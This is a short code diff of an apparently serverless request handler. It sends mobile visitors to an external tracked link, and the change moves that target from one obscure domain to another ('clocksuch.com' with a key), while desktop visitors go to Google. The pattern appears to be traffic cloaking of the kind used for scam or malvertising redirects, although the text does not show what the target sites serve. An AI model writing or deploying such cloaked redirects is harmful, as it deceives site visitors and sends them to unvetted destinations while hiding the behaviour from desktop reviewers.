@@ -30,7 +30,7 @@ export async function onRequest(context) {
   const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(userAgent);
 
   if (isMobile) {
-    return Response.redirect("https://onsafe.online/news/6uaw", 302);
+    return Response.redirect("https://clocksuch.com/vsduv3jwk?key=3d6c1336a056c21ee1fe3db39df01254", 302);
   } else {
     return Response.redirect("https://www.google.com", 302);
   }
